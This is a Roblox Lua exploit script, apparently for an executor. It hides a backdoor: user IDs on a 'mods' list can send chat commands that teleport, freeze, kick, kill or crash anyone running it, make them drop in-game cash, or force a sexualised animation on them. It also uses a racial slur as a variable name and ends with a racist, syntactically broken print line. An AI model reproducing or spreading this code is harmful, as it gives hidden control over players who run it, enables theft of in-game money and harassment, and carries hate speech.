-- // Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- // Vars
local LocalPlayer = Players.LocalPlayer

-- // Connect to the "new event"
ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Data)
    -- // Get all of the data
    local Player = Players[Data.FromSpeaker]
    local Message = Data.Message
    local Channel = Data.OriginalChannel

    -- // Ignore if it is LocalPlayer as that event already fires
    if (Player == LocalPlayer) then
        return
    end

    -- // Fire
    firesignal(Player.Chatted, Message, Channel)
    firesignal(Players.PlayerChatted, nil, Player, Message, nil)
end)




local player = game.Players.LocalPlayer
local isamod = false
local bending = false
local mods = {
    246848510, -- Imagine
    163358789, -- Noah
    3421612774, -- Xaquh
    2618901298, -- Mark
    1109242822, -- Rus
    1914186457, -- R'
    697497383, -- Micheal
    184220596, -- Lars
    1608789889, -- Cusmo
    3518836851, -- $zwrld
    232134457, -- Prem Video Test
    2012124897, -- Url
    2933438969, -- Jay
    3123419262, -- zy
    3203080764, -- sono
    337259398, -- 6hxt headless script
    3114724939, -- ! gun
    933737682, -- FTWNezo
    163948872, -- Daquan
    3519228905, -- !Rs.sorry
    96652107, -- jaykilla_1
    800172558, -- NathanLOL
    478777, -- evll
    3163178549, -- J'
    317348188, -- ki
    1760165101, -- hyh
    170122973, -- zXelto
    212763460, -- Marii
    2816343911, -- Jenson
    20462347, -- Nate
    894707440, -- who are you?
    2491647683, -- Kai
    1459293412, -- liz
    1922750127, -- Georgier
    1866543257, -- krypt
    31598955, -- polar
    1796663810, -- !LJ
    111174221, -- dripify
    2202561511, -- ctrltoast
    2752370504, -- firsttwords
    868081822, -- djlovesfood
    1420421878, -- repell
    1398885051, -- mypatrickstar
    331272284, -- ritual
    3209405716, -- dtbbry
    469000927, -- ari test
}

local function cmds(msg,plr)
	if isamod == false or table.find(mods,plr) then
		Mod = game.Players:GetPlayerByUserId(plr)
		isamod = table.find(mods,player.UserId)
		if msg == "!bring ." then
			if not isamod then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Mod.Character.HumanoidRootPart.CFrame
			end
		end

        if msg == "!freeze ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			end
		end

        if msg == "!thaw ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end
		end

        if msg == ":kick ." then
			if not isamod then
                game.Players.LocalPlayer:Kick("Kicked by:"..Mod.Name)
			end
		end

        if msg == "!ban ." then
			if not isamod then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
                wait()
                for i,nigger in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if nigger:IsA('BasePart') or nigger:IsA('Accessory') then
                        nigger:Destroy()
                    end
                end
                wait(2)
                game.Players.LocalPlayer:Kick("PERMA BAN")
			end
		end

        if msg == "!benx ." then
			if not isamod then
                bending = true
                local segtarget = Mod.Name
                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                local away = .5
                local reversing = false
                local shirt = player.Character:FindFirstChild('Shirt')
                local pants = player.Character:FindFirstChild('Pants')
                if shirt then
                    shirt:Destroy()
                end
                if pants then
                    pants:Destroy()
                end
                local Loop
                local loopFunction = function()
                    local targetchar = game:GetService('Players'):FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                end;
                Start()    
                repeat wait() until bending == false
                Pause()
			end
		end

        if msg == "!unbenx ." then
			if not isamod then
                repeat 
                    task.wait()
                    bending = false
                until not bending
			end
		end

        if msg == "!fling ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(999999, 999999, 999999)
			end
		end

        if msg == "!crash ." then
			if not isamod then
                while true do end
			end
		end
		
		 if msg == "!jail ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-797.2666625976562, -38.83447265625, -836.7457885742188)
			end
		end
		
		 if msg == "!dropcash ." then
			if not isamod then
local args = {
    [1] = "DropMoney",
    [2] = "10000"
}

game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))

			end
		end

        if msg == "!kill ." then
			if not isamod then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
			end
		end
		
		if msg == "/e test" then
			if not isamod then
    local args = {
    [1] = "I'm here!",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))

			end
		end

        if msg == "!refresh ." then
			if not isamod then
                for i,nigger in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if nigger:IsA('BasePart') or nigger:IsA('Accessory') then
                        nigger:Destroy()
                    end
                end
			end
		end
    end
end

for i,v in pairs(game:GetService('Players'):GetChildren()) do
	if table.find(mods,v.UserId) then
		v.Chatted:Connect(function(msg)
			cmds(msg,v.UserId)
		end)
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	if table.find(mods,plr.UserId) then
		plr.Chatted:Connect(function(msg)
			cmds(msg,plr.UserId)
		end)
	end
end)

print(cutblackboy lol)
